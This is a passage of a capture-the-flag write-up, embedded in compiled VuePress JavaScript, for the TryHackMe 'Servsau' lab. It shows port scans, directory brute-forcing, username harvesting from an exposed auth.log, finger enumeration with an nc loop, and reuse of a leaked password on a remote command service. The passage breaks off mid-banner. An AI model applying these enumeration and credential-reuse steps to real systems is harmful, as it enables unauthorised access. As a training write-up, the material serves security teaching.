(window.webpackJsonp=window.webpackJsonp||[]).push([[14],{225:function(t,s,a){"use strict";a.r(s);var n=a(0),e=Object(n.a)({},(function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"servsau"}},[t._v("Servsau")]),t._v(" "),a("p",[t._v("This is the writeup of the "),a("a",{attrs:{href:"https://tryhackme.com/room/servsau",target:"_blank",rel:"noopener noreferrer"}},[t._v("Servsau machine in tryhackme"),a("OutboundLink")],1),t._v(". I hardly post any writeups but I have learnt something interesting in this machine so wanted to share with you all. In this write I will also share how I think and approach to solve the box.")]),t._v(" "),a("p",[t._v("Hope you will learn something new from this writeup as well.")]),t._v(" "),a("h2",{attrs:{id:"enumeration"}},[t._v("Enumeration")]),t._v(" "),a("p",[t._v("Lets start our enumeration with basic nmap scan.")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ nmap "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("10.10")]),t._v(".32.20 -vv "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 10.10.32.20 is the ip of machine")]),t._v("\n\nPORT   STATE  SERVICE REASON\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("21")]),t._v("/tcp closed "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("ftp")]),t._v("     conn-refused\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("22")]),t._v("/tcp "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("open")]),t._v("   "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("ssh")]),t._v("     syn-ack\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("79")]),t._v("/tcp "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("open")]),t._v("   finger  syn-ack\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("80")]),t._v("/tcp "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("open")]),t._v("   http    syn-ack\n")])])]),a("p",[t._v("On basic scan we got some interesting ports i.e "),a("code",[t._v("79")]),t._v(" and "),a("code",[t._v("80")]),t._v(".")]),t._v(" "),a("p",[t._v("Let's run the nmap full port scan on background and further enumerate port "),a("code",[t._v("79")]),t._v(" and "),a("code",[t._v("80")]),t._v(".")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ namp -p- "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("10.10")]),t._v(".32.20 -vv\n")])])]),a("h3",{attrs:{id:"port-80"}},[t._v("Port 80")]),t._v(" "),a("p",[t._v("Lets start with port 80 as we all are more familiar with this port.\nOn first visit there is nothing much on website, just a static page with\n"),a("strong",[t._v('"If you want the food, sit at the table." − Kiran Ghimire')]),t._v(" and some Username and passwords (nothing useful)")]),t._v(" "),a("p",[t._v("Lets do enumerate directories in web.")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ dirsearch -u http://10.10.32.20\n\n\n  _"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(".")]),t._v(" _ _  _  _  _ _"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_    v0.4.1\n "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("||")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" _"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("/_"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("||")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\nExtensions: php, aspx, jsp, html, js "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" HTTP method: GET "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" Threads: "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("30")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" Wordlist size: "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("10877")]),t._v("\n\nOutput File: /home/parallels/.dirsearch/reports/10.10.32.20/_22-02-07_19-30-10.txt\n\nError Log: /home/parallels/.dirsearch/logs/errors-22-02-07_19-30-10.log\n\nTarget: http://10.10.32.20/\n\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("19")]),t._v(":30:10"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting: \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("19")]),t._v(":30:14"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  276B  - /.ht_wsr.txt                                                                                                             \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("19")]),t._v(":30:14"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  276B  - /.htaccess.bak1\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("19")]),t._v(":30:14"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  276B  - /.htaccess.orig\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("19")]),t._v(":30:14"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  276B  - /.htaccess.save\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("19")]),t._v(":30:14"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  276B  - /.htaccess.sample\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("19")]),t._v(":30:14"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  276B  - /.htaccess_sc\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("19")]),t._v(":30:14"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  276B  - /.htaccess_extra\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("19")]),t._v(":30:14"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  276B  - /.htaccess_orig\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("19")]),t._v(":30:14"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  276B  - /.htaccessBAK\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("19")]),t._v(":30:14"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  276B  - /.htaccessOLD2\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("19")]),t._v(":30:14"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  276B  - /.htaccessOLD\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("19")]),t._v(":30:15"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  276B  - /.html           \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("19")]),t._v(":30:15"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  276B  - /.htm\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("19")]),t._v(":30:15"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  276B  - /.htpasswd_test\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("19")]),t._v(":30:15"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  276B  - /.htpasswds\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("19")]),t._v(":30:15"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  276B  - /.httr-oauth\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("19")]),t._v(":30:48"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("200")]),t._v(" -    2KB - /index.html                                                                                         \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("19")]),t._v(":30:50"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("301")]),t._v(" -  308B  - /log  -"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("  http://10.10.32.20/log/                                                                      \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("19")]),t._v(":30:50"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("200")]),t._v(" -  931B  - /log/                             \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("19")]),t._v(":31:00"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  276B  - /server-status                                                                            \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("19")]),t._v(":31:00"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  276B  - /server-status/\n")])])]),a("p",[t._v("We found an interesting directory "),a("code",[t._v("/log/")]),t._v(". Upon visiting the "),a("code",[t._v("/log/")]),t._v(" directory there is a file name "),a("code",[t._v("auth.log")])]),t._v(" "),a("p",[t._v("Seeing the content of "),a("code",[t._v("auth.log")]),t._v(" . It looks like a auth log file of ubuntu. From this log file we can enumerate the username of the machine.")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("cat")]),t._v(" auth.log"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("grep")]),t._v(" password "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("awk")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'{print "),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$9")]),t._v("}'")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("sort")]),t._v(" -u\nbaeker\nbekcha\ninvalid\nmantaboy\npetrio\n")])])]),a("p",[t._v("We got the possible username for the machine. There is nothing more left to do in web as there is just a static html page and a log file.")]),t._v(" "),a("h3",{attrs:{id:"port-79"}},[t._v("Port 79")]),t._v(" "),a("p",[t._v("Doing some googling on port 79, I found that it can be used to further enumerate the username. If you ever see some strange port just visit Hacktricks and search for that port.\n"),a("a",{attrs:{href:"https://book.hacktricks.xyz/pentesting/pentesting-finger",target:"_blank",rel:"noopener noreferrer"}},[t._v("Finger on Hacktrick"),a("OutboundLink")],1)]),t._v(" "),a("p",[t._v("Now we have possible list of username from auth.log lets use that in port 79.")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token for-or-select variable"}},[t._v("i")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("in")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$(")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("cat")]),t._v(" user.txt"),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v(")")])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("do")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("echo")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"'),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$i")]),t._v('"')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("nc")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("10.10")]),t._v(".32.20 "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("79")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("done")]),t._v("\nLogin: baeker                           Name: \nDirectory: /home/baeker                 Shell: /bin/sh\nNever logged in.\nNo mail.\nNo Plan.\nLogin: bekcha                           Name: \nDirectory: /home/bekcha                 Shell: /bin/sh\nNever logged in.\nNo mail.\nPlan:\nNo plan\nfinger: invalid: no such user.\nLogin: mantaboy                         Name: \nDirectory: /home/mantaboy               Shell: /bin/sh\nNever logged in.\nNo mail.\nProject:\nHy, did you "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("find")]),t._v(" anything?\nPlan:\nHe was planning to hack Petrio's computer. Petrio is a very sophisticated hacker, he changed his computer username to petriod  and password to h@ack3dP3tri0.\n\nLogin: petrio                           Name: \nDirectory: /home/petrio                 Shell: /bin/sh\nLast login Fri Feb  "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("4")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("16")]),t._v(":13 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("UTC"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" on tty4\nNo mail.\nPlan:\nWe have to "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("make")]),t._v(" it soon.\n\n")])])]),a("p",[t._v("There is some interesting notes on user mantaboy.\nWe found the possible username and password for the machine.\n"),a("code",[t._v("petriod:h@ack3dP3tri0")]),t._v(" or "),a("code",[t._v("petrio:h@ack3dP3tri0")])]),t._v(" "),a("p",[t._v("I tried to login to the ssh using the credential but it failed and looks like we can only login to machine using sshkey only.")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("ssh")]),t._v(" petrio@10.10.32.20       \nThe authenticity of "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("host")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'10.10.32.20 (10.10.32.20)'")]),t._v(" can"),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'t be established.\nECDSA key fingerprint is SHA256:wh0pQAHWIHWib+NK4iV7n/9RzdXC41Ts/af9E8DilXg.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("10.10")]),t._v(".32.20' "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("ECDSA"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" to the list of known hosts.\npetrio@10.10.32.20: Permission denied "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("publickey"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(".\n")])])]),a("p",[t._v("As we need public key to login to ssh the password is useless here.")]),t._v(" "),a("p",[t._v("Now lets return to out nmap full port scan because eveything seems like a deadend here.")]),t._v(" "),a("p",[t._v("On nmap full port scan we got a new open port "),a("code",[t._v("20011")]),t._v("\nLets vist this port now.")]),t._v(" "),a("h2",{attrs:{id:"getting-shell"}},[t._v("Getting Shell")]),t._v(" "),a("p",[t._v("After connecting to port "),a("code",[t._v("20011")]),t._v(" it is asking for the username and password.\nLuckily the username and passwort that we got from finger worked here.")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("nc")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("10.10")]),t._v(".32.20 "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("20011")]),t._v(" \n__        __   _                            _____       __  __         ____                           \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("      / /__"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ___ ___  _ __ ___   ___  "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_   _"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("__   "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("  "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("/  "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_   _  / ___"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("  ___ _ ____   _____ _ __ \n "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(" /"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(" / / _ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("/ __/ _ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'_ ` _ \\ / _ \\   | |/ _ \\  | |\\/| | | | | \\___ \\ / _ \\ '")]),t._v("__"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(" / / _ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(" '__"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(" V  V /  __/ "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("  __/   "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("  "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("  ___"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("  __/ "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("   "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(" V /  __/ "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("   \n   "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("_/"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("_/ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("___"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("___"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("___/"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("___"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("   "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("___/  "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("  "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("__, "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("____/ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("___"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("_/ "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("___"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("   \n                                                               "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("___/                                  \n\n\nUsername: petrio\nPass: h@ack3dP3tri0\nCommand: \n")])])]),a("p",[t._v("It is asking for command so I am assuming it will run some bash command. I tried "),a("code",[t._v("id")]),t._v(" as command but nothing happened it just closed without displaying anything.")]),t._v(" "),a("p",[t._v("At this point I was confused either it run bash command or something else.\nTo confirm it run bash. I opened a http web server in my machine and sent a curl req from command.")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ python -m SimpleHTTPServer "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("80")]),t._v("\nServing HTTP on "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0.0")]),t._v(".0.0 port "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("80")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("..")]),t._v(".\n\n")])])]),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("nc")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("10.10")]),t._v(".32.20 "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("20011")]),t._v(" \n__        __   _                            _____       __  __         ____                           \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("      / /__"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ___ ___  _ __ ___   ___  "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_   _"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("__   "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("  "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("/  "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_   _  / ___"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("  ___ _ ____   _____ _ __ \n "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v(" 